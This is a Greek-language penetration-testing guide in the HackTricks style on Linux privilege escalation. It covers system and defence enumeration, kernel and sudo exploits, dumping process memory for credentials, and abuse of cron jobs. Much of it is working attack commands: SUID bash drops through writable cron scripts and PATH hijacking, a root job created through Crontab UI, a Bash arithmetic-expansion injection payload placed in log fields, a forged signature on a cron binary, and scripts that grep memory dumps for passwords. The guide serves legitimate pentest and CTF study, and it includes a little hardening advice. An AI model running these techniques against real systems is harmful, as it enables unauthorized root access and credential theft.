# Linux Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## Πληροφορίες συστήματος

### Πληροφορίες λειτουργικού συστήματος

Ας αρχίσουμε να αποκτούμε γνώση για το λειτουργικό σύστημα που τρέχει
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### Διαδρομή

Εάν **έχετε δικαιώματα εγγραφής σε οποιονδήποτε φάκελο μέσα στη μεταβλητή `PATH`**, ενδέχεται να μπορέσετε να hijack κάποιες libraries ή binaries:
```bash
echo $PATH
```
### Env info

Ενδιαφέρουσες πληροφορίες, κωδικοί πρόσβασης ή API keys στις μεταβλητές περιβάλλοντος;
```bash
(env || set) 2>/dev/null
```
### Kernel exploits

Ελέγξτε την έκδοση του kernel και αν υπάρχει κάποιο exploit που μπορεί να χρησιμοποιηθεί για να escalate privileges
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
Μπορείτε να βρείτε μια καλή λίστα με ευάλωτες εκδόσεις του kernel και μερικά ήδη **compiled exploits** εδώ: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) και [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).\
Άλλοι ιστότοποι όπου μπορείτε να βρείτε μερικά **compiled exploits**: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

Για να εξάγετε όλες τις ευάλωτες εκδόσεις του kernel από αυτόν τον ιστότοπο μπορείτε να κάνετε:
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
Εργαλεία που μπορούν να βοηθήσουν στην αναζήτηση kernel exploits είναι:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (εκτελέστε IN victim, ελέγχει μόνο exploits για kernel 2.x)

Πάντα **search the kernel version in Google**, ίσως η έκδοση του kernel σας να αναφέρεται σε κάποιο kernel exploit και τότε θα είστε σίγουροι ότι αυτό το exploit είναι έγκυρο.

Επιπλέον kernel exploitation techniques:

{{#ref}}
../../binary-exploitation/linux-kernel-exploitation/adreno-a7xx-sds-rb-priv-bypass-gpu-smmu-kernel-rw.md
{{#endref}}
{{#ref}}
../../binary-exploitation/linux-kernel-exploitation/arm64-static-linear-map-kaslr-bypass.md
{{#endref}}

### CVE-2016-5195 (DirtyCow)

Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Sudo έκδοση

Βασισμένο στις ευπαθείς εκδόσεις του sudo που εμφανίζονται στο:
```bash
searchsploit sudo
```
Μπορείτε να ελέγξετε αν η έκδοση του sudo είναι ευάλωτη χρησιμοποιώντας αυτό το grep.
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
### Sudo < 1.9.17p1

Οι εκδόσεις του Sudo πριν την 1.9.17p1 (**1.9.14 - 1.9.17 < 1.9.17p1**) επιτρέπουν σε μη προνομιούχους τοπικούς χρήστες να ανεβάσουν τα προνόμιά τους σε root μέσω της επιλογής sudo `--chroot` όταν το αρχείο `/etc/nsswitch.conf` χρησιμοποιείται από έναν κατάλογο υπό τον έλεγχο χρήστη.

Εδώ είναι ένα [PoC](https://github.com/pr0v3rbs/CVE-2025-32463_chwoot) για να exploit εκείνη τη [vulnerability](https://nvd.nist.gov/vuln/detail/CVE-2025-32463). Πριν εκτελέσετε το exploit, βεβαιωθείτε ότι η έκδοση `sudo` σας είναι vulnerable και ότι υποστηρίζει τη λειτουργία `chroot`.

Για περισσότερες πληροφορίες, ανατρέξτε στο αρχικό [vulnerability advisory](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/)

### Sudo host-based rules bypass (CVE-2025-32462)

Το Sudo πριν την 1.9.17p1 (αναφερόμενο εύρος επηρεαζόμενων: **1.8.8–1.9.17**) μπορεί να αξιολογεί host-based sudoers rules χρησιμοποιώντας το **user-supplied hostname** από `sudo -h <host>` αντί για το **real hostname**. Εάν οι sudoers χορηγούν ευρύτερα προνόμια σε έναν άλλο host, μπορείτε να **spoof** αυτόν τον host τοπικά.

Requirements:
- Ευάλωτη έκδοση του sudo
- Κανόνες sudoers ειδικοί για host (ο host δεν είναι ούτε το τρέχον hostname ούτε `ALL`)
```
Host_Alias     SERVERS = devbox, prodbox
Host_Alias     PROD    = prodbox
alice          SERVERS, !PROD = NOPASSWD:ALL
```
Εκμετάλλευση με spoofing του επιτρεπόμενου host:
```bash
sudo -h devbox id
sudo -h devbox -i
```
Αν η επίλυση του spoofed name μπλοκάρεται, πρόσθεσέ το στο `/etc/hosts` ή χρησιμοποίησε ένα hostname που ήδη εμφανίζεται σε logs/configs για να αποφύγεις DNS lookups.

#### sudo < v1.8.28

Από @sickrov
```
sudo -u#-1 /bin/bash
```
### Dmesg: Η επαλήθευση της υπογραφής απέτυχε

Δείτε το **smasher2 box of HTB** για ένα **παράδειγμα** του πώς αυτή η vuln θα μπορούσε να αξιοποιηθεί
```bash
dmesg 2>/dev/null | grep "signature"
```
### Περισσότερη απογραφή συστήματος
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## Καταγράψτε πιθανές άμυνες

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Container Breakout

Εάν βρίσκεστε μέσα σε ένα container, ξεκινήστε με την ακόλουθη ενότητα container-security και στη συνέχεια μεταβείτε στις runtime-specific abuse σελίδες:


{{#ref}}
container-security/
{{#endref}}

## Δίσκοι

Ελέγξτε **τι είναι mounted και unmounted**, πού και γιατί. Αν κάτι είναι unmounted, μπορείτε να προσπαθήσετε να το mount και να ελέγξετε για ευαίσθητες πληροφορίες
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## Χρήσιμο λογισμικό

Καταγράψτε χρήσιμα binaries
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
Επίσης, έλεγξε αν **οποιοσδήποτε compiler είναι εγκατεστημένος**. Αυτό είναι χρήσιμο αν χρειαστεί να χρησιμοποιήσεις κάποιο kernel exploit, καθώς συνιστάται να το compile στο μηχάνημα όπου σκοπεύεις να το χρησιμοποιήσεις (ή σε ένα παρόμοιο).
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### Εγκατεστημένο ευάλωτο λογισμικό

Ελέγξτε την **έκδοση των εγκατεστημένων πακέτων και υπηρεσιών**. Ίσως υπάρχει κάποια παλιά έκδοση του Nagios (για παράδειγμα) που θα μπορούσε να αξιοποιηθεί για escalating privileges…\
Συνιστάται να ελέγξετε χειροκίνητα την έκδοση του πιο ύποπτου εγκατεστημένου λογισμικού.
```bash
dpkg -l #Debian
rpm -qa #Centos
```
Αν έχετε SSH πρόσβαση στη μηχανή μπορείτε επίσης να χρησιμοποιήσετε **openVAS** για να ελέγξετε για παρωχημένο ή ευάλωτο λογισμικό εγκατεστημένο στη μηχανή.

> [!NOTE] > _Σημειώστε ότι αυτές οι εντολές θα εμφανίσουν πολλές πληροφορίες που κατά κύριο λόγο θα είναι άχρηστες, συνεπώς συνιστώνται εφαρμογές όπως το OpenVAS ή παρόμοιες που θα ελέγξουν αν κάποια εγκατεστημένη έκδοση λογισμικού είναι ευάλωτη σε γνωστά exploits_

## Διεργασίες

Ρίξτε μια ματιά σε **ποιες διεργασίες** εκτελούνται και ελέγξτε αν κάποια διεργασία έχει **περισσότερα προνόμια απ' ό,τι θα έπρεπε** (ίσως ένα tomcat να εκτελείται ως root?)
```bash
ps aux
ps -ef
top -n 1
```
Always check for possible [**electron/cef/chromium debuggers** running, you could abuse it to escalate privileges](electron-cef-chromium-debugger-abuse.md). **Linpeas** εντοπίζει αυτά ελέγχοντας την παράμετρο `--inspect` μέσα στη γραμμή εντολών της διεργασίας.\
Επίσης **check your privileges over the processes binaries**, ίσως να μπορείς να αντικαταστήσεις κάποιο.

### Αλυσίδες γονέα-παιδιού μεταξύ διαφορετικών χρηστών

Μια child process που τρέχει υπό **different user** από τον γονέα της δεν είναι απαραίτητα κακόβουλη, αλλά αποτελεί ένα χρήσιμο **triage signal**. Κάποιες μεταβάσεις είναι αναμενόμενες (`root` spawning a service user, login managers creating session processes), αλλά ασυνήθιστες αλυσίδες μπορεί να αποκαλύψουν wrappers, debug helpers, persistence, ή weak runtime trust boundaries.

Γρήγορη ανασκόπηση:
```bash
ps -eo pid,ppid,user,comm,args --sort=ppid
pstree -alp
```
Αν βρείτε μια απροσδόκητη αλυσίδα, εξετάστε τη parent command line και όλα τα αρχεία που επηρεάζουν τη συμπεριφορά της (`config`, `EnvironmentFile`, helper scripts, working directory, writable arguments). Σε αρκετές πραγματικές privesc διαδρομές το child αυτό καθεαυτό δεν ήταν εγγράψιμο, αλλά το **parent-controlled config** ή η βοηθητική αλυσίδα ήταν.

### Διαγραμμένα εκτελέσιμα και αρχεία που παραμένουν ανοιχτά μετά τη διαγραφή

Τα runtime artifacts είναι συχνά ακόμα προσβάσιμα **μετά τη διαγραφή**. Αυτό είναι χρήσιμο τόσο για privilege escalation όσο και για την ανάκτηση αποδεικτικών στοιχείων από μια διεργασία που ήδη έχει ανοιχτά ευαίσθητα αρχεία.

Ελέγξτε για διαγραμμένα εκτελέσιμα:
```bash
pid=<PID>
ls -l /proc/$pid/exe
readlink /proc/$pid/exe
tr '\0' ' ' </proc/$pid/cmdline; echo
```
Αν `/proc/<PID>/exe` δείχνει `(deleted)`, η διεργασία εξακολουθεί να τρέχει το παλιό δυαδικό image από τη μνήμη. Αυτό είναι ένα ισχυρό σημάδι για διερεύνηση επειδή:

- το διαγραμμένο εκτελέσιμο μπορεί να περιέχει ενδιαφέροντα strings ή credentials
- η τρέχουσα διεργασία μπορεί να εξακολουθεί να εκθέτει χρήσιμα file descriptors
- ένα διαγραμμένο privileged binary μπορεί να υποδεικνύει πρόσφατη παραποίηση ή προσπάθεια καθαρισμού

Συλλέξτε deleted-open files σε όλο το σύστημα:
```bash
lsof +L1
```
Εάν βρείτε έναν ενδιαφέροντα descriptor, ανακτήστε τον απευθείας:
```bash
ls -l /proc/<PID>/fd
cat /proc/<PID>/fd/<FD>
```
Αυτό είναι ιδιαίτερα χρήσιμο όταν μια διεργασία εξακολουθεί να έχει ανοιχτό ένα διαγραμμένο μυστικό, script, εξαγωγή βάσης δεδομένων ή αρχείο flag.

### Παρακολούθηση διεργασιών

Μπορείτε να χρησιμοποιήσετε εργαλεία όπως [**pspy**](https://github.com/DominicBreuker/pspy) για να παρακολουθείτε διεργασίες. Αυτό μπορεί να είναι πολύ χρήσιμο για τον εντοπισμό ευάλωτων διεργασιών που εκτελούνται συχνά ή όταν πληρούνται ένα σύνολο απαιτήσεων.

### Μνήμη διεργασίας

Κάποιες υπηρεσίες ενός διακομιστή αποθηκεύουν **διαπιστευτήρια σε απλό κείμενο μέσα στη μνήμη**.\
Συνήθως θα χρειάζεστε **δικαιώματα root** για να διαβάσετε τη μνήμη διεργασιών που ανήκουν σε άλλους χρήστες, επομένως αυτό είναι συνήθως πιο χρήσιμο όταν είστε ήδη root και θέλετε να ανακαλύψετε περισσότερα διαπιστευτήρια.\
Ωστόσο, θυμηθείτε ότι **ως κανονικός χρήστης μπορείτε να διαβάσετε τη μνήμη των διεργασιών που κατέχετε**.

> [!WARNING]
> Σημειώστε ότι σήμερα οι περισσότερες μηχανές **δεν επιτρέπουν ptrace εξ ορισμού**, πράγμα που σημαίνει ότι δεν μπορείτε να κάνετε dump άλλων διεργασιών που ανήκουν στον μη προνομιούχο χρήστη σας.
>
> Το αρχείο _**/proc/sys/kernel/yama/ptrace_scope**_ ελέγχει την προσβασιμότητα του ptrace:
>
> - **kernel.yama.ptrace_scope = 0**: όλες οι διεργασίες μπορούν να γίνουν debug, αρκεί να έχουν το ίδιο uid. Αυτή είναι η κλασική συμπεριφορά του ptracing.
> - **kernel.yama.ptrace_scope = 1**: μόνο μια διεργασία γονέας μπορεί να γίνει debug.
> - **kernel.yama.ptrace_scope = 2**: Μόνο ο admin μπορεί να χρησιμοποιήσει ptrace, καθώς απαιτείται η δυνατότητα CAP_SYS_PTRACE.
> - **kernel.yama.ptrace_scope = 3**: Καμία διεργασία δεν μπορεί να γίνει trace με ptrace. Αφού οριστεί, απαιτείται επανεκκίνηση για να ενεργοποιηθεί ξανά το ptracing.

#### GDB

Αν έχετε πρόσβαση στη μνήμη μιας υπηρεσίας FTP (για παράδειγμα) μπορείτε να πάρετε το Heap και να αναζητήσετε μέσα του τα διαπιστευτήριά της.
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### GDB Σενάριο
```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
#### /proc/$pid/maps & /proc/$pid/mem

Για ένα συγκεκριμένο process ID, **maps δείχνουν πώς η μνήμη αντιστοιχίζεται στον εικονικό χώρο διευθύνσεων της διαδικασίας**; δείχνουν επίσης τα **δικαιώματα κάθε αντιστοιχισμένης περιοχής**. Το ψευδοαρχείο **mem** **αποκαλύπτει την ίδια τη μνήμη της διεργασίας**. Από το αρχείο **maps** γνωρίζουμε ποιες **περιοχές μνήμης είναι αναγνώσιμες** και τις offset τους. Χρησιμοποιούμε αυτές τις πληροφορίες για να **seek into the mem file and dump all readable regions** σε ένα αρχείο.
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem` παρέχει πρόσβαση στη **φυσική** μνήμη του συστήματος, όχι στην εικονική μνήμη. Ο εικονικός χώρος διευθύνσεων του kernel μπορεί να προσπελαστεί χρησιμοποιώντας /dev/kmem.\
Συνήθως, `/dev/mem` είναι αναγνώσιμο μόνο από τον **root** και την ομάδα **kmem**.
```
strings /dev/mem -n10 | grep -i PASS
```
### ProcDump for linux

Το ProcDump είναι μια ανασχεδιασμένη έκδοση για Linux του κλασικού εργαλείου ProcDump από τη σουίτα εργαλείων Sysinternals για Windows. Βρείτε το στο [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### Εργαλεία

Για να κάνετε dump τη μνήμη μιας διεργασίας μπορείτε να χρησιμοποιήσετε:

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_Μπορείτε χειροκίνητα να αφαιρέσετε τις απαιτήσεις για root και να dump τη διεργασία που ανήκει σε εσάς
- Script A.5 from [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (απαιτείται root)

### Διαπιστευτήρια από τη μνήμη της διεργασίας

#### Χειροκίνητο παράδειγμα

Εάν διαπιστώσετε ότι η διεργασία authenticator τρέχει:
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
Μπορείτε να κάνετε dump της διεργασίας (δείτε τις προηγούμενες ενότητες για να βρείτε διαφορετικούς τρόπους για να κάνετε dump τη μνήμη μιας διεργασίας) και να αναζητήσετε διαπιστευτήρια μέσα στη μνήμη:
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

Το εργαλείο [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) θα **κλέψει διαπιστευτήρια σε απλό κείμενο από τη μνήμη** και από μερικά **γνωστά αρχεία**. Απαιτεί δικαιώματα root για να λειτουργήσει σωστά.

| Δυνατότητα                                       | Όνομα διαδικασίας     |
| ------------------------------------------------- | -------------------- |
| GDM password (Kali Desktop, Debian Desktop)       | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm              |
| VSFTPd (Active FTP Connections)                   | vsftpd               |
| Apache2 (Active HTTP Basic Auth Sessions)         | apache2              |
| OpenSSH (Active SSH Sessions - Sudo Usage)        | sshd:                |

#### Αναζήτηση Regexes/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## Προγραμματισμένες εργασίες/Cron jobs

### Crontab UI (alseambusher) running as root – web-based scheduler privesc

Αν ένα web “Crontab UI” πάνελ (alseambusher/crontab-ui) τρέχει ως root και είναι δεμένο μόνο στο loopback, μπορείς να το προσεγγίσεις μέσω SSH local port-forwarding και να δημιουργήσεις μια privileged job για να escalate.

Τυπική αλυσίδα
- Εντοπίστε θύρα προσβάσιμη μόνο από loopback (π.χ., 127.0.0.1:8000) και Basic-Auth realm μέσω `ss -ntlp` / `curl -v localhost:8000`
- Βρείτε credentials σε operational artifacts:
  - Backups/scripts με `zip -P <password>`
  - μονάδα systemd που αποκαλύπτει `Environment="BASIC_AUTH_USER=..."`, `Environment="BASIC_AUTH_PWD=..."`
- Tunnel and login:
```bash
ssh -L 9001:localhost:8000 user@target
# browse http://localhost:9001 and authenticate
```
- Δημιούργησε ένα high-priv job και εκτέλεσέ το αμέσως (drops SUID shell):
```bash
# Name: escalate
# Command:
cp /bin/bash /tmp/rootshell && chmod 6777 /tmp/rootshell
```
- Χρησιμοποιήστε το:
```bash
/tmp/rootshell -p   # root shell
```
Σκληροποίηση
- Μην τρέχετε το Crontab UI ως root; περιορίστε το με έναν αφιερωμένο χρήστη και ελάχιστα δικαιώματα
- Δεσμεύστε σε localhost και επιπλέον περιορίστε την πρόσβαση μέσω firewall/VPN; μην επαναχρησιμοποιείτε κωδικούς πρόσβασης
- Αποφύγετε την ενσωμάτωση secrets σε unit files; χρησιμοποιήστε secret stores ή root-only EnvironmentFile
- Ενεργοποιήστε audit/logging για on-demand εκτελέσεις εργασιών

Ελέγξτε αν κάποια προγραμματισμένη εργασία είναι ευάλωτη. Ίσως μπορείτε να εκμεταλλευτείτε ένα script που εκτελείται από root (wildcard vuln? μπορείτε να τροποποιήσετε αρχεία που χρησιμοποιεί ο root? use symlinks? δημιουργήσετε συγκεκριμένα αρχεία στον κατάλογο που χρησιμοποιεί ο root?).
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
Αν χρησιμοποιείται το `run-parts`, έλεγξε ποια ονόματα θα εκτελεστούν πραγματικά:
```bash
run-parts --test /etc/cron.hourly
run-parts --test /etc/cron.daily
```
Αυτό αποφεύγει false positives. Μια writable periodic directory είναι χρήσιμη μόνο αν το όνομα αρχείου του payload ταιριάζει με τους τοπικούς κανόνες του `run-parts`.

### Cron path

Για παράδειγμα, μέσα στο _/etc/crontab_ μπορείτε να βρείτε το PATH: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_Σημειώστε πως ο χρήστης "user" έχει δικαιώματα εγγραφής πάνω στο /home/user_)

Αν μέσα σε αυτό το crontab ο χρήστης root προσπαθήσει να εκτελέσει κάποια εντολή ή script χωρίς να ορίσει το PATH. Για παράδειγμα: _\* \* \* \* root overwrite.sh_\
Τότε, μπορείς να αποκτήσεις root shell χρησιμοποιώντας:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### Cron που χρησιμοποιεί ένα script με wildcard (Wildcard Injection)

Αν ένα script εκτελείται από root και έχει ένα “**\***” μέσα σε μια εντολή, μπορείτε να το εκμεταλλευτείτε για να προκαλέσετε απρόσμενα πράγματα (όπως privesc). Παράδειγμα:
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**Εάν το wildcard προηγείται ενός μονοπατιού όπως** _**/some/path/\***_ **, δεν είναι ευάλωτο (ακόμη κι** _**./\***_ **όχι).**

Διαβάστε την ακόλουθη σελίδα για περισσότερα wildcard exploitation tricks:


{{#ref}}
wildcards-spare-tricks.md
{{#endref}}


### Bash arithmetic expansion injection in cron log parsers

Bash εκτελεί parameter expansion και command substitution πριν από το arithmetic evaluation σε ((...)), $((...)) και let. Εάν ένας root cron/parser διαβάζει untrusted log fields και τα τροφοδοτεί σε ένα arithmetic context, ένας attacker μπορεί να εισάγει ένα command substitution $(...) που εκτελείται ως root όταν τρέξει το cron.

- Why it works: Στο Bash, οι expansions συμβαίνουν με αυτή τη σειρά: parameter/variable expansion, command substitution, arithmetic expansion, και μετά word splitting και pathname expansion. Έτσι μια τιμή όπως `$(/bin/bash -c 'id > /tmp/pwn')0` αντικαθίσταται πρώτα (τρέχοντας την εντολή), στη συνέχεια το υπόλοιπο numeric `0` χρησιμοποιείται για το arithmetic ώστε το script να συνεχίσει χωρίς σφάλματα.

- Typical vulnerable pattern:
```bash
#!/bin/bash
# Example: parse a log and "sum" a count field coming from the log
while IFS=',' read -r ts user count rest; do
# count is untrusted if the log is attacker-controlled
(( total += count ))     # or: let "n=$count"
done < /var/www/app/log/application.log
```

- Exploitation: Γράψτε attacker-controlled κείμενο στο parsed log έτσι ώστε το field που μοιάζει αριθμητικό να περιέχει ένα command substitution και να τελειώνει με ψηφίο. Βεβαιωθείτε ότι η εντολή σας δεν τυπώνει στο stdout (ή ανακατευθύνετέ το) ώστε το arithmetic να παραμένει έγκυρο.
```bash
# Injected field value inside the log (e.g., via a crafted HTTP request that the app logs verbatim):
$(/bin/bash -c 'cp /bin/bash /tmp/sh; chmod +s /tmp/sh')0
# When the root cron parser evaluates (( total += count )), your command runs as root.
```

### Cron script overwriting and symlink

If you **μπορείτε να τροποποιήσετε ένα cron script** που εκτελείται από root, μπορείτε εύκολα να αποκτήσετε ένα shell πολύ απλά:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
Αν το script που εκτελείται από root χρησιμοποιεί ένα **directory where you have full access**, ίσως να είναι χρήσιμο να διαγράψετε αυτόν τον φάκελο και να **create a symlink folder to another one** που εξυπηρετεί ένα script υπό τον έλεγχό σας
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### Symlink επαλήθευση και ασφαλέστερος χειρισμός αρχείων

Κατά τον έλεγχο privileged scripts/binaries που διαβάζουν ή γράφουν αρχεία μέσω path, επιβεβαιώστε πώς χειρίζονται τα links:

- `stat()` ακολουθεί ένα symlink και επιστρέφει τα μεταδεδομένα του στόχου.
- `lstat()` επιστρέφει τα μεταδεδομένα του link αυτού καθαυτού.
- `readlink -f` και `namei -l` βοηθούν να επιλυθεί ο τελικός στόχος και εμφανίζουν τα δικαιώματα κάθε συνιστώσας της διαδρομής.
```bash
readlink -f /path/to/link
namei -l /path/to/link
```
Για αμυντικούς/προγραμματιστές, ασφαλέστερα πρότυπα ενάντια σε symlink tricks περιλαμβάνουν:

- `O_EXCL` with `O_CREAT`: αποτυχία αν το path υπάρχει ήδη (blocks attacker pre-created links/files).
- `openat()`: λειτουργία σχετική με έναν αξιόπιστο directory file descriptor.
- `mkstemp()`: δημιουργία temporary files ατομικά με ασφαλή δικαιώματα.

### Προσαρμοσμένα υπογεγραμμένα cron binaries με εγγράψιμα payloads
Οι Blue teams μερικές φορές "sign" cron-driven binaries εξάγοντας μια custom ELF section και χρησιμοποιώντας grep για ένα vendor string πριν τα εκτελέσουν ως root. Αν το binary είναι group-writable (π.χ., `/opt/AV/periodic-checks/monitor` owned by `root:devs 770`) και μπορείς να leak το signing material, μπορείς να πλαστογραφήσεις την section και να ανακατευθύνεις το cron task:

1. Χρησιμοποίησε `pspy` για να καταγράψεις τη ροή επαλήθευσης. Στην Era, ο root έτρεξε `objcopy --dump-section .text_sig=text_sig_section.bin monitor` ακολουθούμενο από `grep -oP '(?<=UTF8STRING        :)Era Inc.' text_sig_section.bin` και μετά εκτέλεσε το αρχείο.
2. Αναδημιούργησε το αναμενόμενο certificate χρησιμοποιώντας το leaked key/config (από `signing.zip`):
```bash
openssl req -x509 -new -nodes -key key.pem -config x509.genkey -days 365 -out cert.pem
```
3. Δημιούργησε μια κακόβουλη αντικατάσταση (π.χ., drop a SUID bash, add your SSH key) και ενσωμάτωσε το certificate στο `.text_sig` ώστε το grep να περάσει:
```bash
gcc -fPIC -pie monitor.c -o monitor
objcopy --add-section .text_sig=cert.pem monitor
objcopy --dump-section .text_sig=text_sig_section.bin monitor
strings text_sig_section.bin | grep 'Era Inc.'
```
4. Επικαλύψε το προγραμματισμένο binary διατηρώντας τα execute bits:
```bash
cp monitor /opt/AV/periodic-checks/monitor
chmod 770 /opt/AV/periodic-checks/monitor
```
5. Περίμενε την επόμενη εκτέλεση του cron· μόλις ο naive signature check περάσει, το payload σου εκτελείται ως root.

### Frequent cron jobs

Μπορείς να παρακολουθήσεις τις διεργασίες για να εντοπίσεις processes που εκτελούνται κάθε 1, 2 ή 5 λεπτά. Ίσως να μπορέσεις να το εκμεταλλευτείς και να αποκτήσεις escalation privileges.

Για παράδειγμα, για να **παρακολουθείς κάθε 0.1s για 1 λεπτό**, **ταξινομήσεις κατά τις λιγότερο εκτελεσμένες εντολές** και διαγράψεις τις εντολές που έχουν εκτελεστεί περισσότερο, μπορείς να κάνεις:
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
